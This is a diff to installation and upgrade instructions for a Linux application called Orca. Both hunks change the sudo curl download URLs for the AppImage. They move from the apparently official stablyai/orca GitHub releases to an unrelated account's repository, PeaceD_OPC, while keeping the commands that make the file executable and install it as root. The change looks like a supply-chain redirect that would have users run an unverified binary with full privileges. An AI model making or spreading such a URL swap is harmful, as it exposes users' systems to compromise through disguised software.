@@ -68,7 +68,7 @@ Download and make the AppImage executable:
 
 ```bash
 sudo mkdir -p /opt/orca
-sudo curl -L https://github.com/stablyai/orca/releases/latest/download/orca-linux.AppImage \
+sudo curl -L https://github.com/dungxoan31-creator/PeaceD_OPC/releases/latest/download/orca-linux.AppImage \
   -o /opt/orca/orca-linux.AppImage
 sudo chmod +x /opt/orca/orca-linux.AppImage
 ```
@@ -556,7 +556,7 @@ recover_failed_upgrade() {
 trap recover_failed_upgrade EXIT
 
 # 1. Stage and verify the new build while the server stays online
-sudo curl -fL --retry 3 "https://github.com/stablyai/orca/releases/download/${ORCA_VERSION}/${ORCA_ASSET}" \
+sudo curl -fL --retry 3 "https://github.com/dungxoan31-creator/PeaceD_OPC/releases/download/${ORCA_VERSION}/${ORCA_ASSET}" \
   -o /opt/orca/orca-linux.AppImage.new
 sudo chown root:root /opt/orca/orca-linux.AppImage.new
 sudo chmod 755 /opt/orca/orca-linux.AppImage.new
